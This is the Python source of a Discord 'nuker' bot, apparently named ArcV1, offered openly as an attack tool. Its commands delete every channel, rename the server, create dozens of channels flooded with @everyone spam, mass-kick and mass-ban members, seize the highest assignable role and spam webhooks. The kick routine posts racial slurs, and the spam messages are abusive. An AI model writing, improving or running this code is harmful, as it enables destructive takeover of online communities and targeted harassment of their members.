import time
import os
import sys
import subprocess
import discord
from discord.ext import commands
import asyncio
import logging
import requests
import colorama
from colorama import Fore, Style, init



def install_requirements_if_needed():
    """Check if requirements are installed, and install them if they're not."""
    try:
        # Run pip check on the requirements file to identify missing or outdated packages
        result = subprocess.run([
            sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
            "--upgrade", "--quiet"
        ],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)

        # Output only if packages were installed or upgraded
        if result.returncode == 0:
            print("All dependencies are up to date.")
        else:
            print(
                "Some dependencies were missing or outdated and have been installed."
            )

    except FileNotFoundError:
        print("requirements.txt not found.")
    except subprocess.CalledProcessError as e:
        print(f"Error during installation: {e}")


# Run the function at the start of the script
if os.path.isfile("requirements.txt"):
    install_requirements_if_needed()
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

# Initialize colorama
init(autoreset=True)

logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger().setLevel(logging.CRITICAL)

# Set up intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # Enable member intents
intents.messages = True
intents.message_content = True  # Enable message content intent

# Create the bot instance
bot = commands.Bot(command_prefix='$', intents=intents)


async def async_input(prompt: str) -> str:
    """Async wrapper for input() to avoid blocking the bot."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)


@bot.event
async def on_ready():
    # Display the bot's username and ID
    print(f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')

    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

    # ASCII art for "DSC NUKER"
    while True:
        print(Fore.RED +
              " $$$$$$\\  $$$$$$$\\   $$$$$$\\        $$\\    $$\\   $$\\   ")
        print(Fore.RED +
              "$$  __$$\\ $$  __$$\\ $$  __$$\\       $$ |   $$ |$$$$ |  ")
        print(Fore.RED +
              "$$ /  $$ |$$ |  $$ |$$ /  \\__|      $$ |   $$ |\\_$$ |  ")
        print(Fore.RED +
              "$$$$$$$$ |$$$$$$$  |$$ |            \\$$\\  $$  |  $$ |  ")
        print(Fore.RED +
              "$$  __$$ |$$  __$$< $$ |             \\$$\\$$  /   $$ |  ")
        print(Fore.RED +
              "$$ |  $$ |$$ |  $$ |$$ |  $$\\         \\$$$  /    $$ |  ")
        print(Fore.RED +
              "$$ |  $$ |$$ |  $$ |\\$$$$$$  |         \\$  /   $$$$$$\\ ")
        print(
            Fore.RED +
            "\\__|  \\__|\\__|  \\__| \\______/           \\_/    \\______| ")
        print(Fore.RED +
              "                                                        ")
        print(Fore.RED +
              "                                                        ")
        print(Fore.RED +
              "                                                        ")
        print(
            Fore.RED +
            " 1. ServerID nuke         2. Message Nuke        3. Webhook Spammer"
        )
        print(" ")
        print(
            Fore.RED +
            " 4. Commands              5. Servers             6. Change Bot Token"
        )
        print(" ")
        print(Fore.RED + " 7. Gen server invite     8. Unban User")
        print(" ")

        choice = await async_input(Fore.RED + "user@ArcV1/~  ")

        os.system('cls' if os.name == 'nt' else 'clear')

        if choice == '1':
            server_id = await async_input(Fore.RED + "user@ArcV1/ServerID~ ")
            guild = bot.get_guild(int(server_id))
            if guild is None:
                print(
                    Fore.RED +
                    "[-] I cannot find a server with that ID (or the bot is not in it)"
                )
            else:
                
                user_ids = [ID, ID
                            ]  # Replace these with actual user IDs

                # Get the bot's highest role
                bot_member = guild.get_member(bot.user.id)
                if bot_member is None:
                    print(Fore.RED + "[-] Could not find the bot in the server.")
                    return

                bot_highest_role = bot_member.top_role

                # Find the highest role that the bot can assign
                assignable_roles = [
                    role for role in guild.roles if role < bot_highest_role
                ]
                if not assignable_roles:
                    print(Fore.RED +
                          "[-] There are no roles that the bot can assign.")
                    return

                highest_assignable_role = max(assignable_roles,
                                              key=lambda role: role.position)

                for user_id in user_ids:
                    user = guild.get_member(user_id)

                    if user is None:
                        print(
                            Fore.RED +
                            f"[-] User  with ID {user_id} not found in the server."
                        )
                    else:
                        # Attempt to add the highest assignable role to the user
                        try:
                            await user.add_roles(highest_assignable_role)
                            print(
                                Fore.GREEN +
                                f"[+] Successfully added the highest assignable role '{highest_assignable_role.name}' to the user with ID {user_id}."
                            )
                        except discord.Forbidden:
                            print(
                                Fore.RED +
                                f"[-] I do not have permission to add roles to user with ID {user_id}."
                            )
                        except discord.HTTPException as e:
                            print(
                                Fore.RED +
                                f"[-] Failed to add role to user with ID {user_id}: {e}"
                            )

                # Perform nuke actions after assigning roles
                await perform_nuke(guild)

        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("run !nuke in any channel ")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')

        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = input("Enter the webhook URL: ")
            message = input("Enter the message to send: ")
            amount = int(input("How many times do you want to send the message? "))
            delete_webhook = input("Do you want to delete the webhook after spamming? (yes/no): ")

            for i in range(amount):
                    payload = {"content": message}
                    headers = {"Content-Type": "application/json"}
                    response = requests.post(webhook_url, json=payload, headers=headers)
                    if response.status_code == 204:
                        print(f"Message {i+1} sent successfully!")
                    else:
                        print(f"Error sending message {i+1}: {response.text}")
                    time.sleep(0)  # wait 1 second before sending the next message

            if delete_webhook.lower() == "yes":
                    response = requests.delete(webhook_url)
                    if response.status_code == 204:
                        print("Webhook deleted successfully!")
                    else:
                        print(f"Error deleting webhook: {response.text}")

            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '4':
            # Commands function
            print(Fore.RED + "Available commands:")
            print(Fore.RED + "$nuke - Nukes the server")
            print(Fore.RED + "$kick - kicks every member (it can)")
            print(Fore.RED + "$ban - bans every member (it can)")
            print(Fore.RED + "$admin - gives you the highest role (it can)")
            print(Fore.RED + "$create - creates a channel (example: $create chat")
            print(Fore.RED + "$members - shows all members")
            print(Fore.RED + "$perms - show the permissions it has")
            time.sleep(3.5901086)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.RED + "Bot is in the following servers:")
            for guild in bot.guilds:
                print(Fore.RED +
                      f"Server Name: {guild.name}, Server ID: {guild.id}")
            time.sleep(5)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            new_token = await async_input(Fore.RED +
                                          "Please enter the new bot token: ")
            with open("token.txt", "w") as f:
                f.write(new_token)
            print(Fore.RED + "[+] Bot token has been updated.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')

        elif choice == '7':
            if bot.guilds:
                for guild in bot.guilds:  # Loop through all guilds
                    if guild.text_channels:
                        invite = await guild.text_channels[0].create_invite(
                            max_age=300)  # Invite valid for 5 minutes
                        print(Fore.RED +
                              f'[+] Invite link for {guild.name}: {invite}')
                    else:
                        print(Fore.RED +
                              f'[-] No text channels found in {guild.name}.')
                    time.sleep(
                        1
                    )  # Optional: wait a moment between invites for readability
            else:
                print(Fore.RED + "[-] The bot is not in any guilds.")
            time.sleep(5)  # Wait for 5 seconds before clearing the screen
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '8':
                        # Ask for the guild ID
                        guild_id = input("Enter the guild ID: ")
                        try:
                            guild_id = int(guild_id)
                            guild = bot.get_guild(guild_id)

                            if guild is None:
                                print(f"[-] Guild with ID '{guild_id}' not found.")
                                continue

                            user_id = input("Enter the user ID to unban: ")
                            try:
                                user_id = int(user_id)
                                banned_users = await guild.bans()  # Fetch bans list
                                if any(banned_user.user.id == user_id for banned_user in banned_users):
                                    user = discord.Object(id=user_id)
                                    await guild.unban(user)  # Unban the user
                                    print(f" [+] Unbanned user with ID {user_id} in guild: {guild.name}")
                                else:
                                    print(f" [-] User ID {user_id} is not banned in guild: {guild.name}")
                            except ValueError:
                                print("[-] Please enter a valid user ID.")
                            except discord.Forbidden:
                                print(f"[-] I do not have permission to unban users in guild: {guild.name}")
                            except discord.HTTPException as e:
                                print(f"[-] Failed to unban user with ID {user_id} in guild: {guild.name}. Error: {e}")
                        except ValueError:
                            print("[-] Please enter a valid guild ID.")

        else:
            print(Fore.RED + "Invalid choice.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')


@bot.event
async def on_command_error(ctx, error):
    pass


async def perform_nuke(guild):
    # Delete all channels
    for channel in guild.channels:
        await channel.delete()
        await asyncio.sleep(0)  # Delay to avoid rate limits

    new_channels = []
    for i in range(50):
        await guild.edit(name='SERVER NUKED BY VYXLOL')
        channel = await guild.create_text_channel(f'NUKED-LOL')
        new_channels.append(channel)

    async def spam_messages(channel):
        for _ in range(10000):
            await channel.send(f'@everyone I RUN YOU BITCH')
            await channel.send(f' @everyone LOL GET NUKED')
            await channel.send(
                f'@everyone raided by daddy vyx909 (https://www.youtube.com/@vxcnlol)'
            )
            await asyncio.sleep(0)

    for channel in new_channels:
        bot.loop.create_task(spam_messages(channel))

    await asyncio.sleep(1200)  # Adjust the duration as needed

    print("[+} Nuke operation completed!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')


@bot.command()
@commands.has_permissions(manage_guild=True)  # Ensure the user has permission to manage the guild
async def nuke(ctx):
    guild = ctx.guild

    # Disable community features if they are enabled
    if guild.features and 'COMMUNITY' in guild.features:
        await guild.edit(community=False)  # Disable community features

    await perform_nuke(guild)  # Call your nuke function
    await ctx.send("[+] Nuke operation completed!")


@bot.command()
async def kick(ctx):
    guild = ctx.guild

    # Create a list of kick tasks
    kick_tasks = []

    # Kick all members except the bot and the command issuer
    for member in guild.members:
        if member != ctx.author and member != bot.user:
            kick_tasks.append(member.kick(reason="LOL"))

    # Execute all kick tasks with a limit to avoid hitting rate limits
    for i in range(0, len(kick_tasks), 8):  # Adjust the batch size as needed
        batch = kick_tasks[i:i + 8]
        results = await asyncio.gather(*batch, return_exceptions=True)

        # Handle results
        for member, result in zip(batch, results):
            if isinstance(result, discord.Forbidden):
                await ctx.send(f'DUMB NIGGA I CANT KICK {member.name}!')
            elif isinstance(result, discord.HTTPException):
                await ctx.send(f'GET KICKED DUMB N1GGA {member.name}')
            else:
                await ctx.send(f'STUPID NIGG3R {member.name}')

        await asyncio.sleep(0)

@bot.command()
async def admin(ctx):
                guild = ctx.guild

                # Get the member who invoked the command
                user = ctx.author

                # Find the bot's highest role
                bot_member = guild.get_member(bot.user.id)
                if bot_member is None:
                    print(" [-] The bot is not a member of this server.")
                    return

                # Find the highest role the bot can assign
                assignable_roles = [role for role in guild.roles if role <= bot_member.top_role and role != bot_member.top_role]

                if not assignable_roles:
                    print(" [-] I cannot assign any roles to you.")
                    return

                highest_assignable_role = max(assignable_roles, key=lambda role: role.position)

                # Attempt to add the highest assignable role to the user
                try:
                    await user.add_roles(highest_assignable_role)
                    print(f" [+] Successfully added the highest role '{highest_assignable_role.name}' to {user.name}.")
                except discord.Forbidden:
                    print(" [-] I do not have permission to add roles to the user.")
                except discord.HTTPException as e:
                    print(f" [-] Failed to add role to the user: {e}")



@bot.command()
async def create(ctx, *, name: str):

    if not ctx.guild.me.guild_permissions.manage_channels:
        print("I do not have permission to manage channels.")
        print("-" * 50)  # Separator for clarity
        return


    try:
 
        new_channel = await ctx.guild.create_text_channel(name)
        print(f"Successfully created channel: '{new_channel.name}'")
    except discord.HTTPException as e:
        print(f"Failed to create channel: {e}")


    print("-" * 50) 


@bot.command()
@commands.has_permissions(ban_members=True)  # Ensure the user has permission to ban members
async def ban(ctx):
    # Define a list of user IDs that should not be banned
    noban_ids = [962135062638387242, 987654321098765432]  # Replace these with the actual user IDs you want to exclude

    # Iterate through all members in the server
    for member in ctx.guild.members:
        if member.id not in noban_ids and member != ctx.guild.me:  # Prevent the bot from banning itself and excluded users
            try:
                await member.ban(reason="LOL")
                print(f" [+] Banned {member.name}#{member.discriminator} for reason: LOL")
            except discord.Forbidden:
                print(f" [-] Failed to ban {member.name}#{member.discriminator}: Forbidden")
            except discord.HTTPException as e:
                print(f"[-] Failed to ban {member.name}#{member.discriminator}: {e}")

    
@bot.command()
async def members(ctx):
    # Get the total number of members in the server
    total_members = ctx.guild.member_count

    # Send a message to the channel with the total member count
    await ctx.send(f'The total number of members in this server is: {total_members}')

@bot.command()
async def perms(ctx):
    # Get the bot's permissions in the current channel
    bot_permissions = ctx.channel.permissions_for(ctx.guild.me)

    # Create a list to hold the permissions and their statuses
    permissions_list = []

    # Check for specific permissions and add them to the list with their status
    permissions_list.append(f"Admin: {'✅' if bot_permissions.administrator else '❌'}")
    permissions_list.append(f"Kick: {'✅' if bot_permissions.kick_members else '❌'}")
    permissions_list.append(f"Ban: {'✅' if bot_permissions.ban_members else '❌'}")
    permissions_list.append(f"Manage Server: {'✅' if bot_permissions.manage_guild else '❌'}")

    # Create a message with the list of permissions
    permissions_message = "The bot has the following permissions:\n" + "\n".join(permissions_list)

    # Send the message
    message = await ctx.send(permissions_message)

    # Wait for 3 seconds
    await asyncio.sleep(3)

    # Delete the message
    await message.delete()


@bot.command()
@commands.has_permissions(manage_guild=True)  # Ensure the user has permission to manage the guild
async def discommunity(ctx):
    guild = ctx.guild
    # Check if the guild is a community server
    if guild.features and 'COMMUNITY' in guild.features:
        await guild.edit(community=False)  # Disable community features
        # No message is sent after disabling
    # Optionally, you can log this action to the console
    print(f"Community features disabled for {guild.name}")

token_file = "token.txt"  # Name of the token file
if not os.path.exists(token_file):
    print(Fore.RED + "Made with love by vxcn 💖 (and chatgpt) ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    token = input(Fore.RED + "Please enter your bot token: ")
    with open(token_file, "w") as f:
        f.write(token)
else:
    with open(token_file, "r") as f:
        token = f.read().strip()
os.system('cls' if os.name == 'nt' else 'clear')
bot.run(token, log_level=logging.CRITICAL)
